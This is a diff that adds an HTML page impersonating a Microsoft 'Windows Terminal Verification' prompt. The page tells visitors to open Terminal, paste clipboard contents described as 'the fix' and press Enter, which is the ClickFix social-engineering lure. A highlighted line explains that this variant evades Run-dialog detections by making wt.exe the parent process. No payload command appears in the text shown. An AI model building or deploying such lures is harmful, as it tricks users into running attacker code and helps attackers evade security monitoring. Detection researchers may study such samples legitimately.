@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:1rem}
+.card{background:#fff;border-radius:12px;padding:2rem 2.5rem;max-width:400px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.08)}
+.logo{width:42px;height:42px;margin:0 auto .75rem;background:linear-gradient(135deg,#0078d4,#00bcf2);border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:1.2rem;font-weight:700}
+h2{font-size:1.05rem;font-weight:600;color:#1a1a1a;margin-bottom:.5rem}
+.sub{color:#666;font-size:.82rem;margin-bottom:1.5rem;line-height:1.5}
+.steps{background:#e8f4fd;border:1px solid #b3d9f2;border-radius:8px;padding:1rem 1.2rem;text-align:left;margin-bottom:1rem}
+.step{display:flex;gap:.5rem;align-items:flex-start;padding:.35rem 0;font-size:.82rem;color:#333}
+.step-num{width:20px;height:20px;background:#0078d4;color:#fff;border-radius:50%;font-size:.65rem;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.kbd{background:#f0f0f0;border:1px solid #ccc;border-radius:3px;padding:1px 5px;font-family:monospace;font-size:.75rem;color:#333}
+.highlight{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:.6rem;font-size:.72rem;color:#664d03;margin-top:.75rem}
+</style></head><body>
+<div class="card">
+  <div class="logo">&#9636;</div>
+  <h2>Windows Terminal Verification</h2>
+  <p class="sub">A security update requires verification through Windows Terminal</p>
+  <div class="steps">
+    <div class="step"><span class="step-num">1</span> Press <span class="kbd">Win</span> + <span class="kbd">X</span> to open the menu</div>
+    <div class="step"><span class="step-num">2</span> Press <span class="kbd">I</span> to open Terminal</div>
+    <div class="step"><span class="step-num">3</span> Press <span class="kbd">Ctrl</span> + <span class="kbd">V</span> to paste the fix</div>
+    <div class="step"><span class="step-num">4</span> Press <span class="kbd">Enter</span> to apply</div>
+  </div>
+  <div class="highlight">&#9888; This variant bypasses Run dialog detections — the parent process is wt.exe, not explorer.exe</div>
+</div>
+</body></html>
